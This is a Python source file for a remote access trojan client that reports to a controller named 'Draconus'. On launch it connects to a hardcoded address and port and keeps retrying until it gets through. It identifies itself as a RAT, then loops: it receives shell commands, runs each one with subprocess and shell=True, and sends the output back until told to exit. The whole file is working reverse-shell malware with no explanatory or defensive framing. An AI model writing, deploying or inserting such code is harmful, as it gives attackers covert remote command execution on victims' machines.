import socket
import subprocess

SERVER = '192.168.100.16'
PORT = 5050
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'

# length of message (256 bytes)
RAW_LEN = 256

# length of output message (4 kb)
OUT_LEN = 4096


# length of response message (1 bytes)
RAW_ERROR = 1

# response message OK
RAW_NoE = '0'.encode(FORMAT)


TYPE_RAT = 'RAT'

# message to disconnect
MSG_DISC = 'MSG_DISC'

# message uses to send response (it is OK)
MSG_OK = 'MSG_OK'

# message to exit the shell
SHELL_EXIT = 'EXIT'

class Msg:
    def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
        self.pmsg = msg
        self.formats = formats
        if len(msg) > raw_len:
            self.raw_len = len(msg)
        else:
            self.raw_len = raw_len
        
        self.msg = self.make(self.pmsg)
        self.len = self.make(len(self.pmsg), raw_len=RAW_LEN)
      

    def make(self, msg, raw_len=None):
        nmsg = str(msg).encode(self.formats)
        if len(nmsg) < self.raw_len:
            raw_len = RAW_LEN
        else:
            raw_len = self.raw_len
        while len(nmsg) < raw_len:
            nmsg += b' '
        return nmsg


class Rat:
    def __init__(self):
        self.RAT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_connected = False
    
    def connect(self):
        while self.is_connected == False:
            try:
                self.RAT.connect(ADDR)
                self.is_connected = True
            except:
                continue
    # send default pocket (message) to Draconus and recive response (1 bytes)
    # default length is 256 bytes
    def send_pocket(self, msg):
        send = Msg(msg)
        try:
            self.RAT.send(send.msg)
        except:
            pass
        try:
            self.RAT.recv(RAW_ERROR)
        except:
            return 0


    # recive standard pocket (message) and send response (1 bytes)
    # default length is 256 bytes
    def recive_pocket(self):
        output = None
        try:
            rec = self.RAT.recv(RAW_LEN)
        except:
            return 0
        if rec:
            rec = rec.decode(FORMAT).rstrip(' ')
            output = rec
        try:
            self.RAT.send(RAW_NoE)
        except:
            pass
        return output

    # send output message to Draconus. Result of command
    # default length 4kb
    def send_output(self, msg):
        output = Msg(msg, raw_len=OUT_LEN)
        try:
            self.RAT.send(output.msg)
        except:
            pass
        try:
            self.RAT.recv(RAW_ERROR)
        except:
            pass


    def hello_world(self):
        self.send_pocket(TYPE_RAT)

    def recive_orders(self):
        order = None
        while order != SHELL_EXIT:
            order = self.recive_pocket()
            out = self.run_cmd(order)
            self.send_output(out)

    def run_cmd(self, command):
        try:
            out = subprocess.run(command, shell=True, capture_output=True, text=True)

            return out.stdout
        except:
            out = 'Error'
            return out



        


#### START
RAT = Rat()
RAT.connect()
RAT.hello_world()
RAT.recive_orders()




